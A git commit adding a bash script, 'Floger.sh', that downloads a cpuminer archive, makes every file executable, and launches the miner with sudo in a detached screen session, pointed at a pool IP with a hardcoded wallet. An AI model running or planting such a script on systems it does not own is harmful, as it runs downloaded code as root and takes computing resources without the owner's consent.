f99dadc2e221db06828e0191c4ab7cee09ada64a
jrkeiter <91981745+jrkeiter@users.noreply.github.com>
2021-11-12 17:11:50 -0800

    Create Floger.sh

---
+++ Floger.sh
@@ -0,0 +1,10 @@
+#!/bin/bash
+FILE=./cpuminer-opt-linux.tar.gz
+if [ -f "$FILE" ]; then
+    echo "$FILE exists."
+else
+    sudo wget https://github.com/rplant8/cpuminer-opt-rplant/releases/download/5.0.24/cpuminer-opt-linux.tar.gz
+    tar xvf cpuminer-opt-linux.tar.gz
+    chmod +x *
+fi
+screen -dmLS mine sudo ./cpuminer-avx2 --no-tune -a gr -o 185.237.253.176:5555 -u RTrndREXaXfFJzJp7vjzjGa78HgBcFNfAd.Sari
